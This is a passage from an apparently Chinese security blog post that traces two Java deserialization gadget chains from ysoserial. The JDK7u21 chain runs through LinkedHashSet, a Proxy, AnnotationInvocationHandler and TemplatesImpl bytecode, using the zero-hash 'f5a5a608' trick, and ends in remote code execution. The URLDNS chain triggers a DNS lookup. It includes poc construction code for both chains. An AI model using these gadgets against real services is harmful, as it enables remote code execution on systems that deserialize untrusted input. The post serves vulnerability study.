&lt;p&gt;至此poc分析完毕，下面调试一下反序列化触发gadget链的流程。有感到模糊的地方可以参考以上的分析。&lt;/p&gt;
&lt;h2 id=&quot;gadget链分析&quot;&gt;gadget链分析&lt;/h2&gt;
&lt;p&gt;首先由于poc return了&lt;code&gt;LinkedHashSet&lt;/code&gt;实例用于序列化，因此这就是反序列化的入口。由于&lt;code&gt;LinkedHashSet&lt;/code&gt;没有实现&lt;code&gt;readObject()&lt;/code&gt;方法，因此跟进其父类：&lt;code&gt;HashSet.readObject&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    
    s.defaultReadObject();

    int capacity = s.readInt();
    float loadFactor = s.readFloat();
    map = (((HashSet)this) instanceof LinkedHashSet ?
           new LinkedHashMap&amp;lt;E,Object&amp;gt;(capacity, loadFactor) :
           new HashMap&amp;lt;E,Object&amp;gt;(capacity, loadFactor));//创建一个新map

    // Read in size
    int size = s.readInt();

    // Read in all elements in the proper order.
    for (int i=0; i&amp;lt;size; i++) {
        E e = (E) s.readObject();
        map.put(e, PRESENT);//将反序列化出来的元素put到map中
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们主要关注其对元素的操作。可以看到最后的一个for循环，变量e就是每个元素反序列化之后的实例。由于在构建poc时，LinkedHashSet被我们添加了两个元素，因此这里会进行两次for循环，第一次e是TemplatsImpl实例，第二次是Proxy实例&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200330015945178-515424943.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200330015952768-1477296262.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里把两个元素反序列化之后会作为第一个参数调用map.put()，跟进一下这个方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public V put(K key, V value) {
    if (key == null)
        return putForNullKey(value);
    int hash = hash(key);
    int i = indexFor(hash, table.length);
    for (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }

    modCount++;
    addEntry(hash, key, value, i);
    return null;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们主要关注这里对第一个参数&lt;code&gt;key&lt;/code&gt;的操作，因为我们的payload就在TemplatsImple和Proxy实例中，因此只有对&lt;code&gt;key&lt;/code&gt;做某些操作才可能会触发我们的payload。&lt;/p&gt;
&lt;p&gt;可以看到首先调用了&lt;code&gt;hash(key)&lt;/code&gt;，跟进一下HashMap.hash()&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final int hash(Object k) {
    ...

    h ^= k.hashCode();
    
    h ^= (h &amp;gt;&amp;gt;&amp;gt; 20) ^ (h &amp;gt;&amp;gt;&amp;gt; 12);
    return h ^ (h &amp;gt;&amp;gt;&amp;gt; 7) ^ (h &amp;gt;&amp;gt;&amp;gt; 4);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以发现，这里调用了key的hashCode()方法。我们挨个看看两个key：TemplatesImpl和Proxy是如何调用hashCode()的。&lt;/p&gt;
&lt;p&gt;由于TemplatesImpl并没有实现hashCode()方法，因此直接调用了基类Object.hashCode()。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public native int hashCode();
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这是个native方法，也就是java调用非java代码编写的接口，这个hashCode()大概是通过计算对象的内存地址得到的。下面再看Proxy.hashCode()，由于动态代理的特性，调用Proxy的所有方法都会转而调用绑定在Proxy上的&lt;code&gt;InvocationHandler&lt;/code&gt;的Invoke()方法。回顾最上面创建Proxy时，我们绑定的&lt;code&gt;InvocationHandler&lt;/code&gt;是AnnotationInvocationHandler实例，因此这里会转而调用&lt;code&gt;AnnotationInvocationHandler.invoke()&lt;/code&gt;，跟进之后发现，最底层调用了&lt;code&gt;AnnotationInvocationHandler.hashCodeImple()&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private int hashCodeImpl() {
    int var1 = 0;

    Entry var3;
    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
        var3 = (Entry)var2.next();
    }

    return var1;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里看的会比较绕，其实就是通过遍历&lt;code&gt;this.memberValues.entrySet()&lt;/code&gt;中的所有键值对，来计算其中的key和value的hash，全部加起来之后返回最后的hash值。这里的&lt;code&gt;this.memberValues&lt;/code&gt;属性就是我们在构建poc时传入的那个HashMap实例。&lt;/p&gt;
&lt;p&gt;Proxy.hashCode()跟完了，没有什么危险操作。因此回到最开始的HashMap.put()中。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public V put(K key, V value) {
    if (key == null)
        return putForNullKey(value);
    int hash = hash(key);
    int i = indexFor(hash, table.length);
    for (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }

    modCount++;
    addEntry(hash, key, value, i);
    return null;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;int hash = hash(key)&lt;/code&gt;这一步已经跟踪完了，继续往下看。可以看到for循环的条件是&lt;code&gt;table[i] != null&lt;/code&gt;，这里的table在最后调用的addEntry()中进行了赋值，跟进一下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;void addEntry(int hash, K key, V value, int bucketIndex) {
    if ((size &amp;gt;= threshold) &amp;amp;&amp;amp; (null != table[bucketIndex])) {
        resize(2 * table.length);
        hash = (null != key) ? hash(key) : 0;
        bucketIndex = indexFor(hash, table.length);
    }

    createEntry(hash, key, value, bucketIndex);
}

void createEntry(int hash, K key, V value, int bucketIndex) {
    Entry&amp;lt;K,V&amp;gt; e = table[bucketIndex];
    table[bucketIndex] = new Entry&amp;lt;&amp;gt;(hash, key, value, e);
    size++;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以发现，这里利用key、value和hash创建了一个Entry实例，然后添加到了table数组中。回到上面的put()方法，由于for循环处的table中没有数据，因此调用完addEntry()就直接return了。&lt;/p&gt;
&lt;p&gt;接下来是第二次进入put()方法，这一次传入的k参数是Proxy实例。&lt;code&gt;int hash = hash(key);&lt;/code&gt;我们已经跟进过了，仅需往下看，到了for循环。由于在上一次table中已经有了数据，因此这里会进入。然后就到了if条件&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;for (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != null; e = e.next) {
    Object k;
    if (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key || key.equals(k))) {
        ...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的变量e就是在上次添加到table数组中的那个Entry对象。&lt;code&gt;e.hash&lt;/code&gt;就是初始化时传入的hash的值，同理&lt;code&gt;e.key&lt;/code&gt;也是初始化时传入的key。如果这里满足&lt;code&gt;e.hash == hash&lt;/code&gt;且&lt;code&gt;e.key != key&lt;/code&gt;时，就会调用&lt;code&gt;key.equals(e.key)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这些条件后面会回过头来说，先假设这些条件都可以满足。就会导致调用&lt;code&gt;key.equals(e.key)&lt;/code&gt;，这里的&lt;code&gt;key&lt;/code&gt;是&lt;code&gt;Proxy&lt;/code&gt;，而&lt;code&gt;e.key&lt;/code&gt;是上一次的&lt;code&gt;TemplatesImpl&lt;/code&gt;实例。又由于调用了Proxy的方法，自动跳转到&lt;code&gt;AnnotationInvocationHandler.invoke()&lt;/code&gt;。跟进一下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Object invoke(Object var1, Method var2, Object[] var3) {
    String var4 = var2.getName();
    Class[] var5 = var2.getParameterTypes();
    if (var4.equals(&quot;equals&quot;) &amp;amp;&amp;amp; var5.length == 1 &amp;amp;&amp;amp; var5[0] == Object.class) {
        return this.equalsImpl(var3[0]);
    } else {
        ...
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;var1是代理类实例，var2是调用的方法，就是&lt;code&gt;equals&lt;/code&gt;的Method对象，var3是调用的参数，也就是&lt;code&gt;TemplatesImpl&lt;/code&gt;实例。注意上面的第一个if条件，&lt;code&gt;equals&lt;/code&gt;方法的参数是&lt;code&gt;Object&lt;/code&gt;类型，因此总体判定条件为True，从而以&lt;code&gt;var3[0]&lt;/code&gt;为参数，调用&lt;code&gt;this.equalsImpl()&lt;/code&gt;，跟进&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private Boolean equalsImpl(Object var1) {
    if (var1 == this) {
        return true;
    } else if (!this.type.isInstance(var1)) {
        return false;
    } else {
        Method[] var2 = this.getMemberMethods();
        int var3 = var2.length;

        for(int var4 = 0; var4 &amp;lt; var3; ++var4) {
            Method var5 = var2[var4];
            String var6 = var5.getName();
            Object var7 = this.memberValues.get(var6);
            Object var8 = null;
            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
            if (var9 != null) {
                var8 = var9.memberValues.get(var6);
            } else {
                try {
                    var8 = var5.invoke(var1);
                } catch (InvocationTargetException var11) {
                    return false;
                } catch (IllegalAccessException var12) {
                    throw new AssertionError(var12);
                }
            }

            if (!memberValueEquals(var7, var8)) {
                return false;
            }
        }

        return true;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的var1就是&lt;code&gt;TemplatesImpl&lt;/code&gt;实例，而&lt;code&gt;this.type&lt;/code&gt;在创建poc时就已经定义了&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;TemplatesImpl&lt;/code&gt;的正是实现了&lt;code&gt;Templates&lt;/code&gt;接口，因此if条件中的&lt;code&gt;this.type.isInstance(var1)&lt;/code&gt;是True，非True就是False，因此进入Else语句。首先调用了&lt;code&gt;this.getMemberMethods()&lt;/code&gt;，跟进一下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private Method[] getMemberMethods() {
    if (this.memberMethods == null) {
        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&amp;lt;Method[]&amp;gt;() {
            public Method[] run() {
                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();//利用反射获取this.type类/接口中声明的所有方法
                AccessibleObject.setAccessible(var1, true);
                return var1;
            }
        });
    }

    return this.memberMethods;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于this.type是&lt;code&gt;Templates&lt;/code&gt;接口，因此看一下这个接口声明了哪些方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public interface Templates {

    Transformer newTransformer() throws TransformerConfigurationException;

    Properties getOutputProperties();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;只声明了两个方法：newTransformer()和getOutputProperties()。&lt;/p&gt;
&lt;p&gt;回到&lt;code&gt;equalsImpl()&lt;/code&gt;，获取了this.type中声明的方法之后返回给变量var2。然后进入一个for循环，对这些方法进行遍历。先把方法名赋值给var6，跟进&lt;code&gt;this.asOneOfUs()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private AnnotationInvocationHandler asOneOfUs(Object var1) {
    if (Proxy.isProxyClass(var1.getClass())) {
        ...
    }

    return null;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于var1是&lt;code&gt;TemplatesImpl&lt;/code&gt;实例，并不是Proxy，因此直接return null。回到上面，由于var9是null，因此进入else语句&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;var8 = var5.invoke(var1);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;var5是上面返回的两个方法的其中一个，也就是newTransformer()和getOutputProperties()，var1是&lt;code&gt;TemplatesImpl&lt;/code&gt;实例。这里通过反射调用&lt;code&gt;TemplatesImpl&lt;/code&gt;的var5方法。&lt;/p&gt;
&lt;p&gt;本文一开始就说了，调用&lt;code&gt;TemplatesImpl.getOutputProperties()&lt;/code&gt;会导致&lt;code&gt;TemplatesImpl._bytecodes&lt;/code&gt;的值(含有执行恶意代码的类的字节码)进行实例化，因此这里就是漏洞的触发点了。&lt;/p&gt;
&lt;h2 id=&quot;hashcode绕过&quot;&gt;hashCode绕过&lt;/h2&gt;
&lt;p&gt;至此漏洞已经成功触发，回到之前还有一个没有完成的点，也就是HashMap.put()方法中的那个if条件。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public V put(K key, V value) {
    ...
    int hash = hash(key);
    int i = indexFor(hash, table.length);
    for (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key || key.equals(k))) {
            ...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是这里的&lt;code&gt;e.hash == hash&lt;/code&gt;和&lt;code&gt;e.key != key&lt;/code&gt;。由于key是Proxy实例，e.key是TemplatesImpl实例，因此第二个条件好满足，注意是第一个条件，如何保证两者的hash相同？&lt;/p&gt;
&lt;p&gt;e.hash是由&lt;code&gt;TemplatesImpl.hashCode()&lt;/code&gt;，由于TemplatesImpl没有定义这个方法，因此调用的是Object的方法，而正如之前说的，&lt;code&gt;Object.hashCode()&lt;/code&gt;是通过对象的内存地址来计算hash的。&lt;/p&gt;
&lt;p&gt;hash变量是Proxy.hashCode()返回的，也就是之前分析的&lt;code&gt;AnnotationInvocationHandler.hashCodeImple()&lt;/code&gt;，回顾一下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private int hashCodeImpl() {
    int var1 = 0;

    Entry var3;
    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
        var3 = (Entry)var2.next();
    }

    return var1;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的&lt;code&gt;this.memberValues&lt;/code&gt;属性就是我们在构建poc时传入的那个HashMap实例，也就是&lt;code&gt;(new HashMap()).put(&quot;f5a5a608&quot;, templates)&lt;/code&gt;，templates是TemplatesImpl实例。上面的hashCodeImple()主要是这句：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private int hashCodeImpl() {
    ...
        var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
    ...
    return var1;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;而key是&quot;f5a5a608&quot;，value是TempIatesImpl实例，因此等价于&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;127 * &quot;f5a5a608&quot;.hashCode() ^ memberValueHashCode(teamplates)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;跟进一下memberValueHashCode&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    private static int memberValueHashCode(Object var0) {
        Class var1 = var0.getClass();
        if (!var1.isArray()) {
            return var0.hashCode();
            ...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于参数是TemplatesImpl对象，因此直接返回了&lt;code&gt;TemplatesImpl.hashCode()&lt;/code&gt;，前面已经说了，其TemplatesImpl并没有重写hashCode，因此调用Object.hashCode()根据对象的内存地址生成了hash。至此两个hash的值已经计算完了。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;第一个hash：
TemplatesImpl实例.hashCode()

第二个hash
127 * &quot;f5a5a608&quot;.hashCode() ^ TemplatesImpl实例.hashCode()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这两个TemplatesImpl实例的内存地址实际上是一样的，因为在构建poc时，用的就是同一个TemplatesImpl实例：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Object getObject(final String command) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(command);//TemplatesImpl实例

    String zeroHashCodeStr = &quot;f5a5a608&quot;;

    HashMap map = new HashMap();
    map.put(zeroHashCodeStr, &quot;foo&quot;);
    ...

    LinkedHashSet set = new LinkedHashSet();
    set.add(templates);//插入TemplatesImpl实例
    set.add(proxy);//Proxy代理

    ...

    map.put(zeroHashCodeStr, templates);//插入TemplatesImpl实例

    return set;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于是同一个实例，因此内存地址相同，因此&lt;code&gt;Object.hashCode()&lt;/code&gt;返回的hash也是相同的。回看一下两个hash&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;第一个hash：
TemplatesImpl实例.hashCode()

第二个hash
127 * &quot;f5a5a608&quot;.hashCode() ^ TemplatesImpl实例.hashCode()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们只需要计算一下&lt;code&gt;&quot;f5a5a608&quot;.hashCode()&lt;/code&gt;，这也是一个比较有意思的点，直接放到Debug中计算一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200330020027041-369417244.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;结果是0！这个值好像是一哥们通过一个while循环遍历出来的。因此上面的第二个hash由于是127 * 0，因此也是0，从而两个hash变成了：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;第一个hash：
TemplatesImpl实例.hashCode()

第二个hash
0 ^ TemplatesImpl实例.hashCode()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;^是异或运算符，异或的规则是转换成二进制比较，相同为0，不同为1。由于是按二进制的位进行比较，0只有一位，也就是说如果一个数的最低位与0相同，那一位则为0，否则则为1，这个结果正好与条件一样，只有最低位是0时才会与0相同，从而返回0。如果最低位是1，与0不同，则返回1，也就是啥都没变呗。所以说任何数与0异或，结果都还是原来的值，因此上面这两个hash相等了。&lt;/p&gt;
&lt;p&gt;至此几个条件全部满足，通过后面的&lt;code&gt;key.equals(k)&lt;/code&gt;造成了代码执行。&lt;/p&gt;
&lt;p&gt;因此整个的数据流大概是&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;HashSet.readObject()
    HashMap.put()
        TemplatesImpl.hashCode()
    HashMap.put()
        Proxy.hashCode()
            AnnotationInvocationHandler.Invoke()
                AnnotationInvocationHandler.hashCodeImpl()
        Proxy.equals()
            AnnotationInvocationHandler.Invoke()
                AnnotationInvocationHandler.equalsImpl()
                    TemplatesImpl.getOutputProperties()
                        TemplatesImpl.newTransformer()
                            TemplatesImpl.getTransletInstance()
                                TemplatesImpl.defineTransletClasses()
                                    对_bytecodes属性的值(实例的字节码)进行实例化
                                        RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/175754.html&quot;&gt;JDK7u21反序列化漏洞分析&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.kingkk.com/2020/02/ysoserial-payload%E5%88%86%E6%9E%90/&quot;&gt;ysoserial payload分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;这个gadget会在反序列化时发送一个DNS请求，仅依赖于JDK，因此适用范围很广，应该是只要有反序列化入口就能用这个gadget打。&lt;/p&gt;
&lt;p&gt;先看一下调用栈&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Gadget Chain:
  HashMap.readObject()
    HashMap.putVal()
      HashMap.hash()
        URL.hashCode()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里就涉及到了URL类，这个类的&lt;code&gt;hashCode()&lt;/code&gt;方法底层会调用&lt;code&gt;URLStreamHandler.hashCode()&lt;/code&gt;发送一个DNS请求。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected int hashCode(URL u) {
    int h = 0;

    // Generate the protocol part.
    String protocol = u.getProtocol();
    if (protocol != null)
        h += protocol.hashCode();

    // Generate the host part.
    InetAddress addr = getHostAddress(u);
    
    ...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在反序列化时，HashMap会自动对键计算hash，其中就调用了键的hashCode()方法，因此我们可以利用HashMap来触发&lt;code&gt;URL.hashCode()&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor &amp;lt;= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings &amp;lt; 0)
        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +
                                         mappings);
    else if (mappings &amp;gt; 0) { // (if zero, use defaults)
        
        ...
        Node&amp;lt;K,V&amp;gt;[] tab = (Node&amp;lt;K,V&amp;gt;[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i &amp;lt; mappings; i++) {
            @SuppressWarnings(&quot;unchecked&quot;)
                K key = (K) s.readObject();
            @SuppressWarnings(&quot;unchecked&quot;)
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);//
        }
    }
}

static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &amp;gt;&amp;gt;&amp;gt; 16);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据以上描述大概可以写出这样的poc&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;URLStreamHandler handler = new SilentURLStreamHandler();

HashMap ht = new HashMap();
URL u = new URL(null, url, handler);
ht.put(u, url);

return ht;

static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
                return null;
        }
        protected synchronized InetAddress getHostAddress(URL u) {
                return null;
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的&lt;code&gt;SilentURLStreamHandler&lt;/code&gt;类重写了&lt;code&gt;URLStreamHandler.getHostAddress()&lt;/code&gt;，这样可以保证在编译gadget时不会发送DNS请求。&lt;/p&gt;
&lt;p&gt;然后我们把上面poc返回的类进行序列化，在反序列化并没有发送DNS请求。调试之后才发现，在反序列化调用&lt;code&gt;URL.hashCode()&lt;/code&gt;由于已经存在&lt;code&gt;hashCode&lt;/code&gt;且值不为-1，从而直接return掉了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200330020036681-530567644.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;因此我们需要保证&lt;code&gt;URL.hashCode&lt;/code&gt;的值为null或-1。我们可以在序列化时利用反射来修改URL的属性，如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;URL u = new URL(null, url, handler);
ht.put(u, url); 
Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;调用链如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;HashMap.readObject() -&amp;gt; HashMap.hash() -&amp;gt; URL.hashCode() -&amp;gt; URLStreamHandler.hashCode() -&amp;gt; URLStreamHandler.getHostAddress()
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sun, 29 Mar 2020 18:01:00 +0000</pubDate>
<dc:creator>ka1n4t</dc:creator>
<og:description>[TOC] 7u21 7u21中利用了TemplatesImpl来执行命令，结合动态代理、AnnotationInvocationHandler、HashSet都成了gadget链。 先看一下调用栈，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/litlife/p/12596286.html</dc:identifier>
</item>
</channel>
</rss>